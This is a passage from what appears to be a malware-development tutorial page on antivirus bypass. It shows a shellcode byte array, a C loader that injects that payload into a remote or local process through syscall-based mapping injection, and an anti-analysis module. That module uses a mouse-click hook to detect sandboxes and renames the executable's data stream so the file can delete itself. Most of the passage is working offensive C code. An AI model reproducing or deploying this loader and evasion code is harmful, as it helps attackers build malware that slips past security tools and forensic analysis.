	<span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span>
	<span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span>
	<span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span>
	<span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xD6</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span>
	<span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span>
	<span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span>
	<span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span>
	<span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span>
	<span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span>
	<span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span>
	<span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span>
	<span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span>
	<span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span>
	<span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span>
	<span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0xE0</span><span class="token punctuation">,</span>
	<span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span>
	<span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x00</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>



<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	
	DWORD		dwProcessId		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	HANDLE		hProcess		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>


	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">InitializeSyscalls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Failed To Initialize Syscalls Structure \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>


<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">TARGET_PROCESS</span></span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"[i] Targetting Remote Process %s ... \n"</span><span class="token punctuation">,</span> TARGET_PROCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetRemoteProcessHandle</span><span class="token punctuation">(</span>TARGET_PROCESS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwProcessId<span class="token punctuation">,</span> <span class="token operator">&amp;</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Could Not Find Target Process Id \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Target Process Id Detected Of PID : %d \n"</span><span class="token punctuation">,</span> dwProcessId<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">RemoteMappingInjectionViaSyscalls</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> Payload<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>Payload<span class="token punctuation">)</span><span class="token punctuation">,</span> FALSE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Failed To Inject Payload \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>


<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">// TARGET_PROCESS</span></span>



<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">TARGET_PROCESS</span></span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">RemoteMappingInjectionViaSyscalls</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> Payload<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>Payload<span class="token punctuation">)</span><span class="token punctuation">,</span> TRUE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Failed To Inject Payload \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">// !TARGET_POCESS</span></span>


	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-9">Loader Results</h3>
<h4 id="toc-heading-10">Remote Code Injection</h4>
<p><img src="81_files/av-bypass-216782299-f2e9c796-2d79-42e9-b69d-6e4277f531f4.png" alt="image">
<img src="81_files/av-bypass-316782324-aafb32f5-4fec-40e0-bbb3-029ead10c99d.png" alt="image"></p>
<h4 id="toc-heading-11">Local Code Injection</h4>
<p><img src="81_files/av-bypass-416782441-c87f902c-af70-4657-ad39-93d2f977673b.png" alt="image">
<img src="81_files/av-bypass-516782392-ec8ace35-58fe-4ac6-8317-9d553123076b.png" alt="image"></p>
<h3 id="toc-heading-12">Anti-Analysis Features</h3>
<p>To add anti-analysis features create a new file called <code>AntiAnalysis.c</code>. This file will contain the following functionality:</p>
<ul>
<li>
<p>Self-deletion function from the <em>Anti-Debugging - Self-Deletion</em> module.</p>
</li>
<li>
<p>Mouse clicks monitoring feature from the <em>Anti-Virtual Environments - Multiple Techniques</em> module</p>
</li>
<li>
<p>A function to delay execution using <code>NtDelayExecution</code> from the <em>Anti-Virtual Environments - Multiple Delay Execution Techniques</em> module</p>
</li>
</ul>
<p><strong>AntiAnalysis.c</strong></p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"Structs.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"Common.h"</span></span>


<span class="token comment">// Global hook handle variable</span>
HHOOK g_hMouseHook <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token comment">// global mouse clicks counter</span>
DWORD g_dwMouseClicks <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>



<span class="token comment">// The callback function that will be executed whenever the user clicked a mouse button</span>
LRESULT CALLBACK <span class="token function">HookEvent</span><span class="token punctuation">(</span><span class="token keyword">int</span> nCode<span class="token punctuation">,</span> WPARAM wParam<span class="token punctuation">,</span> LPARAM lParam<span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>wParam <span class="token operator">==</span> WM_LBUTTONDOWN <span class="token operator">||</span> wParam <span class="token operator">==</span> WM_RBUTTONDOWN <span class="token operator">||</span> wParam <span class="token operator">==</span> WM_MBUTTONDOWN<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Mouse Click Recorded \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        g_dwMouseClicks<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token function">CallNextHookEx</span><span class="token punctuation">(</span>g_hMouseHook<span class="token punctuation">,</span> nCode<span class="token punctuation">,</span> wParam<span class="token punctuation">,</span> lParam<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>



BOOL <span class="token function">MouseClicksLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    MSG 	Msg <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment">// Installing hook </span>
    g_hMouseHook <span class="token operator">=</span> <span class="token function">SetWindowsHookExW</span><span class="token punctuation">(</span>
        WH_MOUSE_LL<span class="token punctuation">,</span>
        <span class="token punctuation">(</span>HOOKPROC<span class="token punctuation">)</span>HookEvent<span class="token punctuation">,</span>
        <span class="token constant">NULL</span><span class="token punctuation">,</span>
        <span class="token constant">NULL</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_hMouseHook<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] SetWindowsHookExW Failed With Error : %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Process unhandled events</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">GetMessageW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Msg<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">DefWindowProcW</span><span class="token punctuation">(</span>Msg<span class="token punctuation">.</span>hwnd<span class="token punctuation">,</span> Msg<span class="token punctuation">.</span>message<span class="token punctuation">,</span> Msg<span class="token punctuation">.</span>wParam<span class="token punctuation">,</span> Msg<span class="token punctuation">.</span>lParam<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>


BOOL <span class="token function">DeleteSelf</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>


	WCHAR				    szPath<span class="token punctuation">[</span>MAX_PATH <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span> 	    <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	FILE_DISPOSITION_INFO	Delete 			    	    <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	HANDLE				    hFile 			    	    <span class="token operator">=</span> INVALID_HANDLE_VALUE<span class="token punctuation">;</span>
	PFILE_RENAME_INFO		pRename 		    	    <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token keyword">const</span> <span class="token class-name">wchar_t</span><span class="token operator">*</span> 			NewStream 		    	    <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token class-name">wchar_t</span><span class="token operator">*</span><span class="token punctuation">)</span>NEW_STREAM<span class="token punctuation">;</span>
	SIZE_T				    sRename 		    	    <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>FILE_RENAME_INFO<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>NewStream<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Allocating enough buffer for the 'FILE_RENAME_INFO' structure</span>
	pRename <span class="token operator">=</span> <span class="token function">HeapAlloc</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> HEAP_ZERO_MEMORY<span class="token punctuation">,</span> sRename<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pRename<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] HeapAlloc Failed With Error : %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Cleaning up the structures</span>
	<span class="token function">ZeroMemory</span><span class="token punctuation">(</span>szPath<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>szPath<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">ZeroMemory</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Delete<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>FILE_DISPOSITION_INFO<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//--------------------------------------------------------------------------------------------------------------------------</span>
	<span class="token comment">// Marking the file for deletion (used in the 2nd SetFileInformationByHandle call) </span>
	Delete<span class="token punctuation">.</span>DeleteFile <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>

	<span class="token comment">// Setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure</span>
	pRename<span class="token operator">-&gt;</span>FileNameLength <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>NewStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">RtlCopyMemory</span><span class="token punctuation">(</span>pRename<span class="token operator">-&gt;</span>FileName<span class="token punctuation">,</span> NewStream<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>NewStream<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//--------------------------------------------------------------------------------------------------------------------------</span>

	<span class="token comment">// Used to get the current file name</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">GetModuleFileNameW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> szPath<span class="token punctuation">,</span> MAX_PATH <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] GetModuleFileNameW Failed With Error : %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//--------------------------------------------------------------------------------------------------------------------------</span>
	<span class="token comment">// RENAMING</span>

	<span class="token comment">// Opening a handle to the current file</span>
	hFile <span class="token operator">=</span> <span class="token function">CreateFileW</span><span class="token punctuation">(</span>szPath<span class="token punctuation">,</span> DELETE <span class="token operator">|</span> SYNCHRONIZE<span class="token punctuation">,</span> FILE_SHARE_READ<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> OPEN_EXISTING<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>hFile <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] CreateFileW [R] Failed With Error : %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"[i] Renaming :$DATA to %s  ..."</span><span class="token punctuation">,</span> NEW_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Renaming the data stream</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">SetFileInformationByHandle</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> FileRenameInfo<span class="token punctuation">,</span> pRename<span class="token punctuation">,</span> sRename<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] SetFileInformationByHandle [R] Failed With Error : %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"[+] DONE \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">CloseHandle</span><span class="token punctuation">(</span>hFile<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//--------------------------------------------------------------------------------------------------------------------------</span>
	<span class="token comment">// DELEING</span>

	<span class="token comment">// Opening a new handle to the current file</span>
	hFile <span class="token operator">=</span> <span class="token function">CreateFileW</span><span class="token punctuation">(</span>szPath<span class="token punctuation">,</span> DELETE <span class="token operator">|</span> SYNCHRONIZE<span class="token punctuation">,</span> FILE_SHARE_READ<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> OPEN_EXISTING<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>hFile <span class="token operator">==</span> INVALID_HANDLE_VALUE <span class="token operator">&amp;&amp;</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> ERROR_FILE_NOT_FOUND<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token comment">// in case the file is already deleted</span>
		<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>hFile <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] CreateFileW [D] Failed With Error : %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"[i] DELETING ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Marking for deletion after the file's handle is closed</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">SetFileInformationByHandle</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> FileDispositionInfo<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Delete<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>Delete<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
